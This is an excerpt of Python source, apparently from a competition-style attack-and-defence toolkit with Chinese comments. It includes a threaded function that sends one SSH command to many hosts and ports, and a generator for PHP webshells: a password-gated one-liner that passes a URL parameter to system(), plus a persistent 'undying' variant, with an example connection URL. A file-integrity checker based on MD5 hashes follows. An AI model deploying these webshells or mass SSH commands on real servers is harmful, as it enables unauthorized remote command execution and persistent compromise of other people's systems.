    ...
    def sshSend(self,ip_list,port_list,pwd,usr,command):
        for i in ip_list:#获取所有IP地址
            for i2 in port_list:#获取所有端口号
                t=threading.Thread(target=self.sshconn.ssh_Connect,args=(i,usr,pwd,command,i2))
                t.start()#启动多线程发包
    ...
    def php_horse(self):
        ...
        *连接演示:http://xxx.xxx.xxx.xxx/example.php?passwd=(你开头输入的密码)&cmd=(你要执行的命令)
        ...
        if opt == 1:
            ...
            shellcode="<?php if(md5($_GET['passwd'])=='"+passwd2+"'){system($_GET['cmd']);} ?>"#这是一个简单的一句话木马
        if opt == 2:
            print("*不死马生成的木马名为.phpini.php")
            passwd3=r'"'+passwd2+r'"'
            shell=r"'<?php if(md5($_GET[passwd])=="+passwd3+r"){system($_GET[cmd]);}?>'"
...
class FileCheck:
    ...
    def fileMd5Check(self,input_path,opt):#此方法用来检测文件的md5值，从而检测文件是否被修改
        if opt=='yes':
            ...
            file_md5_list = []
            fp = open('./data/filecheck/filemd5.txt','r')
            while 1:
                data = fp.readline()
                if data:
                    file_md5_list.append(data)
                else:
                    break
            fp.close()
            fp = open('./data/filecheck/filemd5_log.txt','w')
            for root,dirs,files in os.walk(input_path):
                for i in files:
                    path=os.path.join(root,i)
                    with open(path,"r",encoding='utf-8') as fp_read:
                        if hashlib.md5(fp_read.read().encode(encoding='utf-8')).hexdigest()+'\n' in file_md5_list:
                            continue
                        else:
                            self.ok = False
                            print("异常文件---》"+path)
